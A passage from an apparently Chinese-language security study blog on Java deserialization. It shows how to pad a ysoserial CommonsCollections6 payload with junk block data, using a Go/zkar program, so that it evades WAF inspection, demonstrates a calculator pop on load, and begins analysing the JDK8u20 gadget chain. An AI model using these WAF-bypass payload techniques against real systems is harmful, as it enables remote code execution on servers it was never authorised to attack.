<p>通过reference，可以实现在readObject时，反序列化任意已经序列化过的对象，以及它们的一些字段。</p>
<h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p>
<p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br>	<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>	.....<br>	yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p>
<ol>
<li><p>ArrayList</p>
</li>
<li><p>LinkedList</p>
</li>
<li><p>HashMap</p>
</li>
</ol>
<p>…..</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223230550344.png" srcset="/img/loading.gif" lazyload alt="image-20230223230550344"> </p>
<p>所以我们可以改造ysoserial</p>
<p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a target="_blank" rel="noopener" href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p>
<p>完整的项目看这个</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p>
<h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p>
<p>但是还有其他的操作</p>
<p>content是由object和blockdata组成，而blockdata是一个适合用来填充脏数据的地方</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>    object<br>    blockdata<br><br>blockdata:<br>    blockdatashort<br>    blockdatalong<br><br>blockdatashort:<br>    <span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br>    <span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure>

<p>可见，blockdata有两种可能性，blockdatashort，顾名思义，前面可以保存的数据较少</p>
<p>我们选择<code>blockdatalong</code></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure>

<p>结构分为三部分</p>
<ul>
<li><code>TC_BLOCKDATALONG</code> 标示符</li>
<li><code>(int)&lt;size&gt;</code> 数据长度，是一个4字节的整型</li>
<li><code>(byte)[size]</code> 数据具体的内容</li>
</ul>
<p>找到我们的CC6利用链，加入下列代码使得其成功写出序列化文件cc6.ser</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc6.ser&quot;</span>);<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>objectOutputStream.writeObject(expMap);<br></code></pre></td></tr></table></figure>

<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093749138.png" srcset="/img/loading.gif" lazyload alt="image-20230414093749138"> </p>
<p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br>	<span class="hljs-string">&quot;io/ioutil&quot;</span><br>	<span class="hljs-string">&quot;log&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	<span class="hljs-comment">// 从文件中读取字节数据</span><br>	data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\ysoserial-master\\cc6.ser&quot;</span>)<br>	<span class="hljs-comment">// 将字节数据转换为序列化对象</span><br>	serialization, err := serz.FromBytes(data)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>	&#125;<br>	<span class="hljs-comment">// 创建一个新的序列化内容，包含一个长数据块</span><br>	<span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>		Flag: serz.JAVA_TC_BLOCKDATALONG, <span class="hljs-comment">//</span><br>		BlockData: &amp;serz.TCBlockData&#123;<br>			Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>		&#125;,<br>	&#125;<br>	<span class="hljs-comment">// 将新的内容追加到序列化对象中</span><br>	serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br>	<span class="hljs-comment">// 将序列化对象转换为字节数据并写入文件</span><br>	ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>填充了一个payload，内容如下</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093914002.png" srcset="/img/loading.gif" lazyload alt="image-20230414093914002"> </p>
<p>使用Java代码加载我们的修改后的ser文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRead</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\Code_Project\\Go\\zkar-master\\cc6-padding.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



<p>能够成功弹出计算器</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093847402.png" srcset="/img/loading.gif" lazyload alt="image-20230414093847402"> </p>
<p>但如此的填充很有缺陷，填充的数据在Payload后面，WAF一旦检查数据包的前N个字符，仍无法绕过，所以我们思考将垃圾字符放在Payload前面</p>
<p>我们原来的顺序是这样的，<code>content</code>在前，<code>blockdata</code>在后</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br></code></pre></td></tr></table></figure>

<p>我们改为这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">serialization.Contents = append([]*serz.TCContent&#123;blockData&#125;,<br>serialization.Contents...)<br></code></pre></td></tr></table></figure>

<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414101213128.png" srcset="/img/loading.gif" lazyload alt="image-20230414101213128"> </p>
<p>发现也能够成功的弹出我们的计算器，可是P神说存在问题，可是我这里尝试不到任何的问题，挖个坑</p>
<h2 id="序列化中的handler"><a href="#序列化中的handler" class="headerlink" title="序列化中的handler"></a>序列化中的handler</h2><p><strong>引用机制</strong></p>
<p>在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p>
<p><strong>成员抛弃</strong></p>
<p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p>
<p>接下来我们看看Handler的重要概念，先用下面的demo查看handler的具体场景</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test.Others;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> ysoserial.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String Name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>        Name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;bridge&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(student, student);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.encodeBase64String(Serializer.serialize(map));<br>        System.out.println(b64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用idea生成base64以后再用zkar分析序列化字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump --base64 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAGnlzb3NlcmlhbC5wcmFjdGljZS5TdHVkZW50x8a8lWlJOVECAAFMAAROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZicmlkZ2VxAH4ABHg=<br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">17</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">11</span><br>        <span class="hljs-meta">@Value</span> - java.util.HashMap - <span class="hljs-number">0x6a</span> <span class="hljs-number">61</span> <span class="hljs-number">76</span> <span class="hljs-number">61</span> 2e <span class="hljs-number">75</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> 6c 2e <span class="hljs-number">48</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">4d</span> <span class="hljs-number">61</span> <span class="hljs-number">70</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">362498820763181265</span> - <span class="hljs-number">0x05</span> <span class="hljs-number">07</span> da c1 c3 <span class="hljs-number">16</span> <span class="hljs-number">60</span> d1<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Float - F - <span class="hljs-number">0x46</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> 0a<br>            <span class="hljs-meta">@Value</span> - loadFactor - <span class="hljs-number">0x6c</span> <span class="hljs-number">6f</span> <span class="hljs-number">61</span> <span class="hljs-number">64</span> <span class="hljs-number">46</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">74</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span><br>        Index <span class="hljs-number">1</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">9</span> - <span class="hljs-number">0x00</span> 09<br>            <span class="hljs-meta">@Value</span> - threshold - <span class="hljs-number">0x74</span> <span class="hljs-number">68</span> <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> 6c <span class="hljs-number">64</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - java.util.HashMap<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">loadFactor</span><br>            <span class="hljs-params">(<span class="hljs-type">float</span>)</span><span class="hljs-number">0.75</span> - <span class="hljs-number">0x3f</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>          threshold<br>            (integer)<span class="hljs-number">12</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0c<br>        <span class="hljs-meta">@ObjectAnnotation</span><br>          TC_BLOCKDATA - <span class="hljs-number">0x77</span><br>            <span class="hljs-meta">@Blockdata</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>          TC_OBJECT - <span class="hljs-number">0x73</span><br>            TC_CLASSDESC - <span class="hljs-number">0x72</span><br>              <span class="hljs-meta">@ClassName</span><br>                <span class="hljs-meta">@Length</span> - <span class="hljs-number">26</span> - <span class="hljs-number">0x00</span> 1a<br>                <span class="hljs-meta">@Value</span> - ysoserial.practice.Student - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e <span class="hljs-number">70</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> 2e <span class="hljs-number">53</span> <span class="hljs-number">74</span> <span class="hljs-number">75</span> <span class="hljs-number">64</span> <span class="hljs-number">65</span> 6e <span class="hljs-number">74</span><br>              <span class="hljs-meta">@SerialVersionUID</span> - -<span class="hljs-number">4051343464870626991</span> - <span class="hljs-number">0xc7</span> c6 bc <span class="hljs-number">95</span> <span class="hljs-number">69</span> <span class="hljs-number">49</span> <span class="hljs-number">39</span> <span class="hljs-number">51</span><br>              <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span><br>              <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>              <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>              []Fields<br>                Index <span class="hljs-number">0</span>:<br>              <span class="hljs-meta">@ClassName</span> - ysoserial.practice.Student<br>                &#123;&#125;Attributes<br>                  Name<br>                    TC_STRING - <span class="hljs-number">0x74</span><br>                      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257541</span><br>                      <span class="hljs-meta">@Length</span> - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>                      <span class="hljs-meta">@Value</span> - bridge - <span class="hljs-number">0x62</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">64</span> <span class="hljs-number">67</span> <span class="hljs-number">65</span><br>          TC_REFERENCE - <span class="hljs-number">0x71</span><br>            <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257540</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">04</span><br>          TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br><br></code></pre></td></tr></table></figure>

<p>可以看到在第二个Student（也就是value）用Handler指向了8257540，也就是第一个Student</p>
<h2 id="多重trycatch"><a href="#多重trycatch" class="headerlink" title="多重trycatch"></a>多重trycatch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryCatch</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryCatch</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> / <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> / <span class="hljs-number">0</span>;<br>                System.out.println(<span class="hljs-string">&quot;Inner End&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Inner Error&quot;</span>);<br>                <span class="hljs-comment">//因为这里没有throws Exception，所以程序不会停止运行</span><br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;Outer End&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Outer Error&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        tryCatch();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Inner</span> <span class="hljs-variable">Error</span><br><span class="hljs-built_in">Outer</span> <span class="hljs-built_in">End</span><br></code></pre></td></tr></table></figure>

<p>可以看出，多层try catch的内层代码抛出异常时，内层代码会中断，但是外层代码会继续执行下去。</p>
<h1 id="JDK8u20分析"><a href="#JDK8u20分析" class="headerlink" title="JDK8u20分析"></a>JDK8u20分析</h1><h2 id="先用一个case来分析"><a href="#先用一个case来分析" class="headerlink" title="先用一个case来分析"></a>先用一个case来分析</h2><h3 id="zero为零抛出异常"><a href="#zero为零抛出异常" class="headerlink" title="zero为零抛出异常"></a>zero为零抛出异常</h3><p>假设存在两个类<code>AnnotationInvocationHandler</code>和<code>BeanContextSupport</code>，具体内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler.java<br><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">10L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> zero;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AnnotationInvocationHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> zero)</span> &#123;<br>        <span class="hljs-built_in">this</span>.zero = zero;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        input.defaultReadObject();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.zero==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-type">double</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-built_in">this</span>.zero;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Hack !!!&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;your number is error!!!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport.java<br><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanContextSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title 